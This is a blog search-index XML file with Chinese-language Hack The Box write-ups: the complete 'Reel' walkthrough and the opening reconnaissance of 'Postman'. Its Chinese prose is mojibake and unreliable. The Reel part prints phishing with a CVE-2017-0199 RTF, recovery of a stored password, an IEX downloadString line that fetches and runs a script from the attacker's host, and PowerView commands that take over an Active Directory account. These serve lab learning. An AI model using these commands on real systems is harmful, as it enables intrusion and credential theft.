<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Reel</title>
    <url>/2021/12/24/Reel/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Host discovery disabled (-Pn). All addresses will be marked <span class="string">&#x27;up&#x27;</span> and scan <span class="built_in">times</span> will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-14 05:18 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.77</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 9997 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     Microsoft ftpd</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)</span><br><span class="line">|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)</span><br><span class="line">|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)</span><br><span class="line">25/tcp open  smtp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   Hello: </span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     EHLO Invalid domain address.</span><br><span class="line">|   Help: </span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">|   NULL: </span><br><span class="line">|_    220 Mail Service ready</span><br><span class="line">| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP, </span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY </span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port25-TCP:V=7.91%I=7%D=11/14%Time=6190E2F5%P=x86_64-pc-linux-gnu%r(NUL</span><br><span class="line">SF:L,18,<span class="string">&quot;220\x20Mail\x20Service\x20ready\r\n&quot;</span>)%r(Hello,3A,<span class="string">&quot;220\x20Mail\x20</span></span><br><span class="line"><span class="string">SF:Service\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n&quot;</span>)</span><br><span class="line">SF:%r(Help,54,<span class="string">&quot;220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20E</span></span><br><span class="line"><span class="string">SF:HLO\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n</span></span><br><span class="line"><span class="string">SF:&quot;</span>);</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">OS fingerprint not ideal because: Missing a closed TCP port so results incomplete</span><br><span class="line">No OS matches <span class="keyword">for</span> host</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 22/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   301.22 ms 10.10.14.1</span><br><span class="line">2   301.21 ms 10.10.10.77</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 185.69 seconds</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>å‘ç°å¼€æ”¾äº†21ç«¯å£ï¼Œå¯ä»¥åŒ¿åç™»å½•ï¼Œå¹¶ä¸”åœ¨documentsç›®å½•ä¸‹å‘ç°äº†ä¸¤ä¸ªdocxæ–‡ä»¶ï¼Œæˆ‘ä»¬å°†å…¶ä¸‹è½½ä¸‹æ¥å¹¶ä½¿ç”¨exiftoolæŸ¥çœ‹å†…å®¹å¦‚ä¸‹<img src="https://img-blog.csdnimg.cn/15c476e67c4941c6b76d60c03fdede70.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>readme.txtæ–‡ä»¶å‘Šè¯‰æˆ‘ä»¬æœ‰äººæ­£åœ¨ç­‰å¾… .rtf æ–‡ä»¶å¹¶å°†æ‰“å¼€å®ƒä»¬è¿›è¡Œå®¡æŸ¥ï¼Œå› ä¸ºè€ƒè™‘åˆ°æœºå™¨ä¸Šæ­£åœ¨è¿è¡Œ SMTP æœåŠ¡ï¼Œè¿™å¯èƒ½æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ï¼Œå…·æœ‰ç½‘ç»œé’“é±¼æ”»å‡»ã€‚<br><img src="https://img-blog.csdnimg.cn/c858f787033a4c5b8a8cbbe73d598b86.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æŸ¥é˜…å®˜æ–¹æ–‡æ¡£å‘ç°ï¼ŒAppLockerå¯ä»¥é˜»æ­¢å¯æ‰§è¡Œæ–‡ä»¶å’Œè„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AppLocker procedure to be documented - <span class="built_in">hash</span> rules <span class="keyword">for</span> exe, msi and scripts  (ps1,vbs,cmd,bat,js) are <span class="keyword">in</span> effect.</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å‘ç°Windows Event Forwarding.docxè¿™ä¸ªæ–‡ä»¶ä¸­å­˜åœ¨ä¸€ä¸ªé‚®ç®±åœ°å€<code>nico@megabank.com</code><br><img src="https://img-blog.csdnimg.cn/14102687e160477884fd2f3e6c8910a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>æ ¹æ®åˆšåˆšreadme.txtçš„æ–‡ä»¶å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•å°†rtfæ–‡ä»¶å‘é€åˆ°è¿™ä¸ªåœ°å€ä¸Šï¼Œæˆ‘ä»¬ä»applicationå­—æ®µä¸­å‘ç°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨wordæ–‡æ¡£çš„æ–¹å¼è¿›è¡Œåˆ›å»ºã€‚å¹¶ä¸”æˆ‘ä»¬åœ¨ç½‘ä¸Šæœç´¢çœ‹åˆ°ï¼Œå…³äºrtfæ–‡ä»¶æ¼æ´åˆ©ç”¨æ˜¯å·²ç»æŠ«éœ²çš„æ¼æ´ç¼–å·<code>CVE-2017-0199</code>ï¼Œæ­¤æ¼æ´å…è®¸åˆ›å»ºæ¶æ„ rtf æ–‡æ¡£ï¼Œåœ¨æ‰“å¼€æ–‡æ¡£æ—¶å¯åŠ¨ HTAï¼ˆè¶…æ–‡æœ¬åº”ç”¨ç¨‹åº)æœ‰æ•ˆè´Ÿè½½ï¼ŒGithub ä¸Šæœ‰ä¸€ä¸ªç”¨äºåˆ¶ä½œåˆ©ç”¨æ­¤æ¼æ´çš„æ¶æ„æ–‡æ¡£çš„ Python å·¥å…·åŒ…ï¼Œä½†ä¹Ÿæœ‰ä¸€ä¸ª Metasploit æ¨¡å—ï¼Œæˆ‘ä»ç„¶å°†ä½¿ç”¨ Python è„šæœ¬ã€‚</p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>é¦–å…ˆæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªhtaçš„è½½è·<br><img src="https://img-blog.csdnimg.cn/b6c156c3e5e84eebb3b7207a29673574.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ¬åœ°å¼€å¯httpæœåŠ¡å™¨<br><img src="https://img-blog.csdnimg.cn/ebf7fdbfa46043bb84f2a0e1c331c6c7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç„¶ååˆ©ç”¨è¿™ä¸ªhtaè„šæœ¬ï¼Œåˆ›å»ºrtfæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/bf21d9b792054d399fe94052c21c3129.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ€åå‘é€é’“é±¼é‚®ä»¶è¿›è¡Œè·å–æƒé™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sendEmail -f 0xdf@megabank.com -t nico@megabank.com -u Test -m <span class="string">&quot;Hey, take a look at this new format procedure&quot;</span> -a document.rtf -s 10.10.10.77 -v</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/f64aa5ef2a984a4e92fd8dfed197da16.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘é€é’“é±¼é‚®ä»¶å¹¶å¼€å¯ç›‘å¬ï¼Œæˆ‘ä»¬å¾—åˆ°äº†nicoè´¦æˆ·çš„ç”¨æˆ·æƒé™<br><img src="https://img-blog.csdnimg.cn/6965f266fe7341beb4fd71506ff9335b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒåˆ°TOMæƒé™"><a href="#ææƒåˆ°TOMæƒé™" class="headerlink" title="ææƒåˆ°TOMæƒé™"></a>ææƒåˆ°TOMæƒé™</h2><p>æˆ‘ä»¬ä»Nicoè´¦æˆ·çš„æ¡Œé¢ä¸Šçœ‹åˆ°ä¸€ä¸ªcred.xmlæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹åŒ…å«äº†passwordå­—æ®µå†…å®¹<br><img src="https://img-blog.csdnimg.cn/b971324dcaa14613a8d91aa6b4997923.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>PowerShell æœ‰ä¸€ä¸ªç§°ä¸º PSCredential çš„å¯¹è±¡ï¼Œå®ƒæä¾›äº†ä¸€ç§å­˜å‚¨ç”¨æˆ·åã€å¯†ç å’Œå‡­æ®çš„æ–¹æ³•ã€‚è¿˜æœ‰ä¸¤ä¸ªå‡½æ•°Import-CliXmlå’ŒExport-CliXmlï¼Œç”¨äºå°†è¿™äº›å‡­æ®ä¿å­˜åˆ°æ–‡ä»¶ä¸­å¹¶ä»æ–‡ä»¶ä¸­æ¢å¤å®ƒä»¬ã€‚è¯¥æ–‡ä»¶æ˜¯Export-CliXmlï¼Œæˆ‘ä»¬å‘ç°Tomçš„å¯†ç æ˜¯<code>1ts-mag1c!!!</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\nico\Desktop&gt;powershell -c <span class="string">&quot;<span class="variable">$cred</span>=Import-CliXml -Path cred.xml;<span class="variable">$cred</span>.GetNetworkCredential() | Format-List *&quot;</span></span><br><span class="line">powershell -c <span class="string">&quot;<span class="variable">$cred</span>=Import-CliXml -Path cred.xml;<span class="variable">$cred</span>.GetNetworkCredential() | Format-List *&quot;</span></span><br><span class="line"></span><br><span class="line">UserName       : Tom</span><br><span class="line">Password       : 1ts-mag1c!!!</span><br><span class="line">SecurePassword : System.Security.SecureString</span><br><span class="line">Domain         : HTB</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºç›®æ ‡ä¸»æœºå¼€æ”¾äº†22ç«¯å£ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¿æ¥ä¸»æœºçš„è¿œç¨‹æœåŠ¡<br><img src="https://img-blog.csdnimg.cn/c0ef87585054476281e5aa1595fa284e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬åœ¨tomçš„æ¡Œé¢çš„AD auditæ–‡ä»¶å¤¹ä¸‹å‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„æ–‡ä»¶å†…å®¹ï¼Œè¿˜æœ‰ä¸€ä¸ªBloodHoundæ–‡ä»¶å¤¹<br><img src="https://img-blog.csdnimg.cn/67be2e3fd4494a14bc46cd3a6af8eb45.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/e9b9cfa8736d42788e6f32b6d3b628fa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»è¿‡æŸ¥é˜…æ–‡ç« å‘ç°ï¼Œbloodhoundé€šè¿‡csvæ–‡ä»¶å½¢å¼ä¿å­˜æ–‡ä»¶çš„ï¼Œéƒ½æ˜¯2.0ç‰ˆæœ¬ä»¥å‰çš„äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼Œä¸€ä¸ªæ˜¯åœ¨ç›®æ ‡ä¸»æœºä¸Šå®‰è£…æ—§ç‰ˆæœ¬çš„bloodhoundï¼ŒäºŒæ˜¯å°†æ”¶é›†åˆ°çš„æ•°æ®ä¸Šä¼ åˆ°æˆ‘ä»¬æ”»å‡»æœºä¸Šè¿›è¡Œåˆ†æï¼Œæˆ‘é€‰æ‹©çš„æ˜¯ç¬¬äºŒç§æ–¹å¼ã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬å°†ç›®æ ‡çš„è„šæœ¬åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œç»•è¿‡powershellçš„ç­–ç•¥é™åˆ¶ã€‚æ”¶é›†åˆ°çš„ä¿¡æ¯ä¿å­˜åœ¨å½“å‰ç›®å½•çš„ä¸€ä¸ªå‹ç¼©åŒ…ä¸­ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).downloadString(<span class="string">&#x27;http://10.10.14.7/sharphound/SharpHound.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/44243984d10a4293a08aebd5b9748298.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸ºäº†ä¼ è¾“æ–¹ä¾¿ï¼Œæˆ‘ä»¬åœ¨æœ¬åœ°å¼€å¯smbæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/65746cbe84ba4b048fb124b74a55a741.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬åœ¨æ”»å‡»æœºä¸Šå¼€å¯bloodhoundåï¼Œå°†å‹ç¼©åŒ…æ‹–è¿›å»è¿›è¡Œåˆ†æï¼Œç‚¹å‡»<code>Shortest Paths to High Value Targets</code>ã€‚ä¸ºäº†æ–¹ä¾¿ç­›é€‰ï¼Œæˆ‘ä»¬é€‰æ‹©tomåˆ°adminçš„ææƒè·¯å¾„å’Œnicoåˆ°adminçš„è·¯å¾„è¿›è¡Œåˆ†æ<br><img src="https://img-blog.csdnimg.cn/29bd464348754983b4412b33ca42a996.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/399172cccb7243948e1b64abf136697b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘çŸ¥é“ claire å¯¹ Backup_Admins ç»„å…·æœ‰ WriteDacl æƒé™ã€‚æˆ‘å¯ä»¥ç”¨å®ƒæŠŠå¥¹åŠ åˆ°ç¾¤é‡Œï¼Œä½†æ˜¯äº‹å…ˆæˆ‘ä»¬å…ˆå¾—è¿æ¥åˆ°claireè¿™ä¸ªç”¨æˆ·ä¸Šã€‚</p>
<h2 id="ææƒåˆ°Administrator"><a href="#ææƒåˆ°Administrator" class="headerlink" title="ææƒåˆ°Administrator"></a>ææƒåˆ°Administrator</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬å°†è‡ªå·±è®¾ç½®ä¸º claire å¸æˆ·çš„æ‰€æœ‰è€…ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥æ›´æ”¹å¥¹çš„å±æ€§ï¼›ç„¶åæˆ‘ä»¬æ›´æ”¹ claire AD å¯¹è±¡çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL) ä»¥æˆäºˆæˆ‘ä»¬è‡ªå·± (Tom) é‡ç½® claire å¯†ç çš„æƒé™ï¼›ç„¶åæˆ‘ä»¬ä¸ºè¯¥å¸æˆ·é€‰æ‹©ä¸€ä¸ªæ–°å¯†ç å¹¶å°†å…¶è½¬æ¢ä¸º SecureString æ ¼å¼ï¼Œè¿™å°±æ˜¯ PowerShell ç”¨äºå¯†ç çš„æ ¼å¼ï¼›æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æˆ‘ä»¬é€‰æ‹©çš„ä¸€ä¸ªæ›´æ”¹ claire çš„å¯†ç ï¼›ä¸ºäº†å°†ç”¨æˆ·æ·»åŠ åˆ°ç»„ï¼Œæˆ‘ä»¬å¿…é¡»æä¾›æœ‰æ•ˆçš„ç”¨æˆ·å‡­æ®ï¼Œå› æ­¤æˆ‘ä»¬å£°æ˜ä¸€ä¸ª PSCredential å¯¹è±¡æ¥åŒ…å« claire çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå› ä¸ºå¥¹æ˜¯å¯¹ Backup_Admins ç»„å…·æœ‰å†™è®¿é—®æƒé™çš„äººï¼›æœ€åæˆ‘ä»¬ä½¿ç”¨å®ƒæ¥å°†è‡ªå·±æ·»åŠ åˆ° Backup_Admins ç»„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; import-module .\PowerView.ps1</span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt;  Set-DomainObjectOwner -Identity claire -OwnerIdentity tom                         </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Add-ObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword  </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; <span class="variable">$password</span>= ConvertTo-SecureString <span class="string">&#x27;Password_123!&#x27;</span> -AsPlainText -Force              </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Set-DomainUserPassword -Identity claire -AccountPassword <span class="variable">$password</span>                 </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; <span class="variable">$creds</span> = New-Object System.Management.Automation.PSCredential(<span class="string">&#x27;HTB\claire&#x27;</span>,<span class="variable">$passwor</span></span><br><span class="line">d)                                                                                                                              </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Add-DomainGroupMember -Identity <span class="string">&#x27;Backup_Admins&#x27;</span> -Members <span class="string">&#x27;claire&#x27;</span> -Credential <span class="variable">$cred</span></span><br><span class="line">s</span><br></pre></td></tr></table></figure>

<p>whoami /allæŸ¥çœ‹åˆ°æˆ‘ä»¬å·²ç»å¤„äºbackup_adminsç»„ä¸­äº†<br><img src="https://img-blog.csdnimg.cn/9ff1c27957d54fe3b71bfa62126f58b1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯æ— æ³•æŸ¥çœ‹root.txtçš„å†…å®¹ï¼Œæˆ‘ä»¬å´å¯ä»¥æŸ¥çœ‹<code>Backup Scripts</code>çš„å†…å®¹<br><img src="https://img-blog.csdnimg.cn/b4491a3626c84023b3f122732aa44800.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½†æ˜¯æˆ‘ä»¬åœ¨<code>BackupScript.ps1</code>ä¸­æ‰¾åˆ°ç®¡ç†å‘˜çš„å¯†ç <br><img src="https://img-blog.csdnimg.cn/3285fc7c314a4f98840bb0bc74f27320.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç›´æ¥ç™»å½•ç®¡ç†å‘˜è´¦å·<br><img src="https://img-blog.csdnimg.cn/f96c6ddacbff4775947400c9dfd03743.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>é‚®ç®±é’“é±¼</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Postman(Redisæœªæˆæƒè®¿é—®)</title>
    <url>/2021/12/24/Postman/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å‘ç°ç›®æ ‡å¼€æ”¾äº†22ã€80ã€6379ç­‰å¸¸è§ç«¯å£</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rootğŸ’€kali)-[~/Desktop/Scan-Scripts]</span><br><span class="line">â””â”€<span class="comment"># ./nmap.sh 10.10.10.160</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 07:32 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.160</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)</span><br><span class="line">|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)</span><br><span class="line">|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: The Cyber Geek<span class="string">&#x27;s Personal Website</span></span><br><span class="line"><span class="string">6379/tcp  open  redis   Redis key-value store 4.0.9</span></span><br><span class="line"><span class="string">10000/tcp open  http    MiniServ 1.910 (Webmin httpd)</span></span><br><span class="line"><span class="string">|_http-title: Site doesn&#x27;</span>t have a title (text/html; Charset=iso-8859-1).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 42.85 seconds</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>æˆ‘ä»¬è®¿é—®ä¸€ä¸‹webæœåŠ¡ï¼Œå‘ç°åªæ˜¯ä¸€ä¸ªæ™®é€šçš„webé¡µé¢è€Œå·²<img src="https://img-blog.csdnimg.cn/31925c3c4c634d4c8dfa4491466b77e0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬æ¨¡ç³Šä¸€ä¸‹ç½‘ç«™è·¯å¾„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/Scan-Scripts]</span><br><span class="line">â””â”€<span class="comment"># dirsearch -u &quot;http://10.10.10.160&quot; -e * -x404,403,500</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.1</span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                        </span><br><span class="line">                                                                                                                                               </span><br><span class="line">Extensions: nmap.sh | HTTP method: GET | Threads: 30 | Wordlist size: 8979</span><br><span class="line"></span><br><span class="line">Output File: /root/.dirsearch/reports/10.10.10.160/_21-11-30_07-47-35.txt</span><br><span class="line"></span><br><span class="line">Error Log: /root/.dirsearch/logs/errors-21-11-30_07-47-35.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.160/</span><br><span class="line">                                                                                                                                               </span><br><span class="line">[07:47:35] Starting: </span><br><span class="line">[07:48:35] 301 -  310B  - /css  -&gt;  http://10.10.10.160/css/                                                                             </span><br><span class="line">[07:48:44] 301 -  312B  - /fonts  -&gt;  http://10.10.10.160/fonts/                                                             </span><br><span class="line">[07:48:48] 301 -  313B  - /images  -&gt;  http://10.10.10.160/images/                        </span><br><span class="line">[07:48:48] 200 -    2KB - /images/</span><br><span class="line">[07:48:50] 200 -    4KB - /index.html                                                                                                 </span><br><span class="line">[07:48:51] 200 -    3KB - /js/                                                                                                              </span><br><span class="line">[07:48:52] 301 -  309B  - /js  -&gt;  http://10.10.10.160/js/                   </span><br><span class="line">[07:49:25] 301 -  313B  - /upload  -&gt;  http://10.10.10.160/upload/                                                                       </span><br><span class="line">[07:49:27] 200 -    8KB - /upload/                                                                          </span><br><span class="line">                                                                                                                       </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>

<!--more-->

